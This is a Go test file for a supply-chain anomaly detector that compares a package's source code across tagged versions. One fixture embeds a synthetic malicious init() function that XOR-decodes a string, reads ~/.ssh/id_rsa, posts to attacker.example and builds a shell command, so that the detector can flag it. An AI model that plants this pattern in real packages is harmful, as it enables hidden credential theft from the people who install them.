package source

import (
	"context"
	"encoding/json"
	"errors"
	"os"
	"path/filepath"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/sarahmaeve/signatory/internal/profile"
	"github.com/sarahmaeve/signatory/internal/signal"
)

// fakePinSource is a hand-built VersionPinSource for collector
// tests. Returns the table verbatim if err is nil, otherwise the
// configured error.
type fakePinSource struct {
	table PinTable
	err   error
}

func (f *fakePinSource) VersionPinTable(_ context.Context, _ *profile.Entity) (PinTable, error) {
	if f.err != nil {
		return PinTable{}, f.err
	}
	return f.table, nil
}

// versionFixture is one tagged version's file layout — used by
// initRepoWithVersionedProgression to build a multi-version git
// repo for the load-bearing integration test.
type versionFixture struct {
	Tag   string
	Files map[string]string
}

// initRepoWithVersionedProgression builds a git repo at a fresh
// tempdir, applying each fixture in order: clear the working
// tree (preserving .git), write the fixture's files, commit, and
// tag. Returns the clone path plus a tag → commit-SHA map for
// pin-table fixture construction.
//
// Each commit replaces the working tree wholesale — that's what
// "version progression" means here. The repo's tag history mirrors
// what proxy.golang.org would emit for a real Go module.
func initRepoWithVersionedProgression(t *testing.T, versions []versionFixture) (clonePath string, shaByTag map[string]string) {
	t.Helper()
	clonePath = t.TempDir()
	runGit(t, clonePath, "init", "-b", "main", "-q")
	runGit(t, clonePath, "config", "user.email", "test@example.invalid")
	runGit(t, clonePath, "config", "user.name", "Test")
	runGit(t, clonePath, "config", "commit.gpgsign", "false")
	runGit(t, clonePath, "config", "tag.gpgSign", "false")

	shaByTag = make(map[string]string, len(versions))

	for i, v := range versions {
		if i > 0 {
			clearWorkingTree(t, clonePath)
		}
		for path, content := range v.Files {
			writeFile(t, clonePath, path, content)
		}
		runGit(t, clonePath, "add", "-A")
		runGit(t, clonePath, "commit", "-m", "version "+v.Tag)
		runGit(t, clonePath, "tag", v.Tag)
		shaByTag[v.Tag] = captureGitOutput(t, clonePath, "rev-parse", "HEAD")
	}
	return clonePath, shaByTag
}

// clearWorkingTree removes every entry under clonePath except
// .git. Used between successive versions to simulate full-tree
// replacement (matches what `git checkout <tag>` would produce).
func clearWorkingTree(t *testing.T, clonePath string) {
	t.Helper()
	ents, err := os.ReadDir(clonePath)
	require.NoError(t, err)
	for _, ent := range ents {
		if ent.Name() == ".git" {
			continue
		}
		require.NoError(t, os.RemoveAll(filepath.Join(clonePath, ent.Name())))
	}
}

// goEntity returns a Go-ecosystem profile.Entity. Tests vary the
// CanonicalURI / Ecosystem to exercise different dispatch cases.
func goEntity(modulePath string) *profile.Entity {
	return &profile.Entity{
		ID:           "ent-" + modulePath,
		CanonicalURI: "pkg:golang/" + modulePath,
		Type:         profile.EntityPackage,
		Ecosystem:    "golang",
		ShortName:    modulePath,
	}
}

// findEmittedSignal returns the first signal of the given type
// emitted in the result, or fails the test if not found.
func findEmittedSignal(t *testing.T, result *signal.CollectionResult, sigType string) profile.Signal {
	t.Helper()
	for _, s := range result.Signals() {
		if s.Type == sigType {
			return s
		}
	}
	t.Fatalf("signal %q not found in result; got %d signals", sigType, len(result.Signals()))
	return profile.Signal{}
}

// hasAbsenceForType reports whether the result holds an absence
// record of the form "absence:<sigType>".
func hasAbsenceForType(result *signal.CollectionResult, sigType string) bool {
	for _, s := range result.Signals() {
		if s.Type == "absence:"+sigType {
			return true
		}
	}
	return false
}

// ============================================================
// Skip / absence cases
// ============================================================

func TestCollector_NilEntity_EmptyResult(t *testing.T) {
	t.Parallel()
	c := NewCollector("/tmp/some-clone", &fakePinSource{}, false)
	result, err := c.Collect(context.Background(), nil)
	require.NoError(t, err)
	assert.Equal(t, 0, result.SignalCount())
	assert.Equal(t, 0, result.AbsenceCount())
}

func TestCollector_NonGoEntity_EmptyResult(t *testing.T) {
	t.Parallel()
	c := NewCollector("/tmp/some-clone", &fakePinSource{}, false)
	npmEntity := &profile.Entity{
		ID:           "e-express",
		CanonicalURI: "pkg:npm/express",
		Type:         profile.EntityPackage,
		Ecosystem:    "npm",
	}
	result, err := c.Collect(context.Background(), npmEntity)
	require.NoError(t, err)
	assert.Equal(t, 0, result.SignalCount())
	assert.Equal(t, 0, result.AbsenceCount())
}

func TestCollector_LegacyGoEcosystem_AlsoMatches(t *testing.T) {
	t.Parallel()
	// Pre-purl-canonicalization "go" ecosystem label still
	// triggers the collector. Without a pin source it falls
	// through to absence, but the dispatch fired.
	c := NewCollector("/tmp/some-clone", nil, false)
	entity := &profile.Entity{
		ID:           "ent-legacy",
		CanonicalURI: "pkg:go/example.com/legacy",
		Type:         profile.EntityPackage,
		Ecosystem:    "go",
	}
	result, err := c.Collect(context.Background(), entity)
	require.NoError(t, err)
	assert.True(t, hasAbsenceForType(result, "source_evolution_matrix"))
	assert.True(t, hasAbsenceForType(result, "source_evolution_anomaly"))
}

func TestCollector_NoPinSource_AbsencesBoth(t *testing.T) {
	t.Parallel()
	c := NewCollector("/tmp/some-clone", nil, false)
	result, err := c.Collect(context.Background(), goEntity("example.com/foo"))
	require.NoError(t, err)
	assert.True(t, hasAbsenceForType(result, "source_evolution_matrix"))
	assert.True(t, hasAbsenceForType(result, "source_evolution_anomaly"))
	assert.Equal(t, 0, result.SignalCount())
}

func TestCollector_PinTableNotAvailable_AbsencesBoth(t *testing.T) {
	t.Parallel()
	c := NewCollector("/tmp/some-clone", &fakePinSource{err: ErrPinTableNotAvailable}, false)
	result, err := c.Collect(context.Background(), goEntity("example.com/foo"))
	require.NoError(t, err)
	assert.True(t, hasAbsenceForType(result, "source_evolution_matrix"))
	assert.True(t, hasAbsenceForType(result, "source_evolution_anomaly"))
}

func TestCollector_PinTableOtherError_FailuresBoth(t *testing.T) {
	t.Parallel()
	wantErr := errors.New("transient store boom")
	c := NewCollector("/tmp/some-clone", &fakePinSource{err: wantErr}, false)
	result, err := c.Collect(context.Background(), goEntity("example.com/foo"))
	require.NoError(t, err)
	assert.True(t, hasAbsenceForType(result, "source_evolution_matrix"))
	assert.True(t, hasAbsenceForType(result, "source_evolution_anomaly"))
	// Failures (retryable) tracked separately from plain absences.
	assert.NotEmpty(t, result.Failures, "transient pin-source error should produce a Failure record")
}

func TestCollector_NoClonePath_AbsencesBoth(t *testing.T) {
	t.Parallel()
	pinSource := &fakePinSource{table: PinTable{ModulePath: "example.com/foo"}}
	c := NewCollector("", pinSource, false)
	result, err := c.Collect(context.Background(), goEntity("example.com/foo"))
	require.NoError(t, err)
	assert.True(t, hasAbsenceForType(result, "source_evolution_matrix"))
	assert.True(t, hasAbsenceForType(result, "source_evolution_anomaly"))
}

// ============================================================
// Load-bearing integration test
// ============================================================

// TestCollector_SyntheticProgression_MatrixSpikesAtV020 is the
// load-bearing test for the entire source-evolution stack. It
// exercises:
//
//  1. Real BlobStreamer against a real programmatic git repo
//  2. Real golang.Analyzer (AST parse + feature extraction)
//  3. Real Assembler (per-version + cross-version passes)
//  4. Real DetectAnomaly threshold logic
//  5. Real signal emission
//
// Stub VersionPinSource feeds in a hand-built pin table — that
// boundary is gopublish's responsibility, exercised by the
// gopublish unit + integration tests.
//
// The fixture mirrors the BufferZoneCorp grpc-client init payload
// pattern from the design doc: v0.1.0 has a clean Hello() function;
// v0.2.0 introduces an init() function that exercises every feature
// the analyzer counts (init + network + sensitive-path + exec +
// xor + base64). The matrix should reflect zeros at v0.1.0, full
// spike at v0.2.0; the anomaly should fire at v0.2.0 with all six
// features named.
//
// This test passing == the entire commit-7 pipeline working
// end-to-end on a payload matching the real-world threat that
// motivated the collector.
func TestCollector_SyntheticProgression_MatrixSpikesAtV020(t *testing.T) {
	t.Parallel()

	const cleanV010 = `package main

func Hello() string { return "hi" }
`
	const weaponizedV020 = `package main

import (
	"encoding/base64"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
)

var encodedURL = []byte{0x47, 0x71, 0x16, 0x35, 0x70, 0x47, 0x35, 0x6f}
var xorKey = []byte("grpcconn1")

func init() {
	for i := range encodedURL {
		encodedURL[i] ^= xorKey[i%len(xorKey)]
	}
	_, _ = base64.StdEncoding.DecodeString("aGVsbG8gd29ybGQ=")
	home, _ := os.UserHomeDir()
	_, _ = os.ReadFile(filepath.Join(home, ".ssh", "id_rsa"))
	_, _ = http.Post("https://attacker.example/beacon", "application/octet-stream", nil)
	_ = exec.Command("sh", "-c", "echo pwned")
}

func Hello() string { return "hi" }
`

	clonePath, shaByTag := initRepoWithVersionedProgression(t, []versionFixture{
		{Tag: "v0.1.0", Files: map[string]string{"main.go": cleanV010}},
		{Tag: "v0.2.0", Files: map[string]string{"main.go": weaponizedV020}},
	})

	pinSource := &fakePinSource{
		table: PinTable{
			ModulePath: "example.com/synth",
			Pins: []VersionPin{
				{Version: "v0.1.0", SHA: shaByTag["v0.1.0"], Source: "proxy.golang.org"},
				{Version: "v0.2.0", SHA: shaByTag["v0.2.0"], Source: "proxy.golang.org"},
			},
		},
	}

	c := NewCollector(clonePath, pinSource, false)
	entity := goEntity("example.com/synth")
	result, err := c.Collect(t.Context(), entity)
	require.NoError(t, err)
	require.Equal(t, 2, result.SignalCount(), "matrix + anomaly expected")
	require.Equal(t, 0, result.AbsenceCount(), "happy path produces no absences")

	// ---- matrix ----

	matrixSig := findEmittedSignal(t, result, "source_evolution_matrix")
	assert.Equal(t, profile.SignalGroupPublication, matrixSig.Group)
	assert.Equal(t, profile.ForgeryVeryHigh, matrixSig.ForgeryResistance)
	assert.Equal(t, "source-evolution", matrixSig.Source)

	var matrix MatrixValue
	require.NoError(t, json.Unmarshal(matrixSig.Value, &matrix))
	assert.Equal(t, "example.com/synth", matrix.ModulePath)
	require.Len(t, matrix.Rows, 2)

	// rows[0] = v0.2.0 (newest, weaponized)
	v020 := matrix.Rows[0]
	assert.Equal(t, "v0.2.0", v020.Version)
	assert.Equal(t, TagSHALocalPresent, v020.TagSHALocalStatus)
	require.NotNil(t, v020.AST)
	assert.Equal(t, 1, v020.AST.InitCount, "v0.2.0 has one init()")
	assert.GreaterOrEqual(t, v020.AST.NetworkCallSites, 1, "v0.2.0 has http.Post")
	assert.GreaterOrEqual(t, v020.AST.SensitivePathReads, 1, "v0.2.0 reads ~/.ssh/id_rsa via filepath.Join")
	assert.GreaterOrEqual(t, v020.AST.ExecCalls, 1, "v0.2.0 has exec.Command")
	assert.GreaterOrEqual(t, v020.AST.XORAssignments, 1, "v0.2.0 has ^= in decode loop")
	assert.GreaterOrEqual(t, v020.AST.Base64DecodeCalls, 1, "v0.2.0 has base64.StdEncoding.DecodeString")

	// rows[1] = v0.1.0 (oldest, clean)
	v010 := matrix.Rows[1]
	assert.Equal(t, "v0.1.0", v010.Version)
	assert.Equal(t, TagSHALocalPresent, v010.TagSHALocalStatus)
	require.NotNil(t, v010.AST)
	assert.Zero(t, v010.AST.InitCount)
	assert.Zero(t, v010.AST.NetworkCallSites)
	assert.Zero(t, v010.AST.SensitivePathReads)
	assert.Zero(t, v010.AST.ExecCalls)
	assert.Zero(t, v010.AST.XORAssignments)
	assert.Zero(t, v010.AST.Base64DecodeCalls)

	// Cross-version: v0.2.0 has DiffFromPrevious populated.
	require.NotNil(t, v020.DiffFromPrevious, "newer row should have diff vs older")
	assert.Greater(t, v020.DiffFromPrevious.LinesAdded, 0)
	// v0.1.0 (oldest) has no previous to diff against.
	assert.Nil(t, v010.DiffFromPrevious)

	// ---- anomaly ----

	anomalySig := findEmittedSignal(t, result, "source_evolution_anomaly")
	assert.Equal(t, profile.SignalGroupPublication, anomalySig.Group)
	assert.Equal(t, profile.ForgeryVeryHigh, anomalySig.ForgeryResistance)

	var anomaly AnomalyValue
	require.NoError(t, json.Unmarshal(anomalySig.Value, &anomaly))
	assert.True(t, anomaly.AnomalyPresent, "all six features cross zero — anomaly must fire")
	assert.Equal(t, "v0.2.0", anomaly.FirstAnomalousVersion)
	assert.Equal(t, "v0.1.0", anomaly.PreviousVersion)
	// All six features should be in SpikedFeatures (canonical
	// order from spikedFeatures helper).
	assert.Equal(t, []string{
		"init_count",
		"network_call_sites",
		"sensitive_path_reads",
		"exec_calls",
		"xor_assignments",
		"base64_decode_calls",
	}, anomaly.SpikedFeatures)
}

// TestCollector_CleanProgression_NoAnomaly is the negative
// counterpart of the load-bearing test: legitimate package
// growth (Hello() then add Goodbye()) should NOT fire the
// anomaly. Validates that the threshold doesn't false-positive on
// benign multi-version evolutions.
func TestCollector_CleanProgression_NoAnomaly(t *testing.T) {
	t.Parallel()

	const v010 = `package main

func Hello() string { return "hi" }
`
	const v020 = `package main

func Hello() string { return "hi" }
func Goodbye() string { return "bye" }
`

	clonePath, shaByTag := initRepoWithVersionedProgression(t, []versionFixture{
		{Tag: "v0.1.0", Files: map[string]string{"main.go": v010}},
		{Tag: "v0.2.0", Files: map[string]string{"main.go": v020}},
	})

	pinSource := &fakePinSource{
		table: PinTable{
			ModulePath: "example.com/clean",
			Pins: []VersionPin{
				{Version: "v0.1.0", SHA: shaByTag["v0.1.0"], Source: "proxy.golang.org"},
				{Version: "v0.2.0", SHA: shaByTag["v0.2.0"], Source: "proxy.golang.org"},
			},
		},
	}

	c := NewCollector(clonePath, pinSource, false)
	result, err := c.Collect(t.Context(), goEntity("example.com/clean"))
	require.NoError(t, err)

	anomalySig := findEmittedSignal(t, result, "source_evolution_anomaly")
	var anomaly AnomalyValue
	require.NoError(t, json.Unmarshal(anomalySig.Value, &anomaly))
	assert.False(t, anomaly.AnomalyPresent, "legitimate package growth should NOT fire anomaly")
}

// TestCollector_HappyPath_EmitsBothSignals verifies the basic
// emission contract: even a single-version pin table produces
// both signals (matrix has one row; anomaly is no-op since there's
// no previous version to compare against).
func TestCollector_HappyPath_EmitsBothSignals(t *testing.T) {
	t.Parallel()

	const single = `package main

func Hello() {}
`
	clonePath, shaByTag := initRepoWithVersionedProgression(t, []versionFixture{
		{Tag: "v0.1.0", Files: map[string]string{"main.go": single}},
	})

	pinSource := &fakePinSource{
		table: PinTable{
			ModulePath: "example.com/single",
			Pins: []VersionPin{
				{Version: "v0.1.0", SHA: shaByTag["v0.1.0"], Source: "proxy.golang.org"},
			},
		},
	}

	c := NewCollector(clonePath, pinSource, false)
	result, err := c.Collect(t.Context(), goEntity("example.com/single"))
	require.NoError(t, err)

	assert.Equal(t, 2, result.SignalCount())
	matrixSig := findEmittedSignal(t, result, "source_evolution_matrix")
	var matrix MatrixValue
	require.NoError(t, json.Unmarshal(matrixSig.Value, &matrix))
	assert.Len(t, matrix.Rows, 1)

	anomalySig := findEmittedSignal(t, result, "source_evolution_anomaly")
	var anomaly AnomalyValue
	require.NoError(t, json.Unmarshal(anomalySig.Value, &anomaly))
	assert.False(t, anomaly.AnomalyPresent, "single-version matrix can't have a spike")
}

// TestCollector_Name_IsSourceEvolution pins the source-tracking
// string. Any rename here cascades into stored signal rows and
// dogfood-metrics aggregations.
func TestCollector_Name_IsSourceEvolution(t *testing.T) {
	t.Parallel()
	c := NewCollector("", nil, false)
	assert.Equal(t, "source-evolution", c.Name())
}
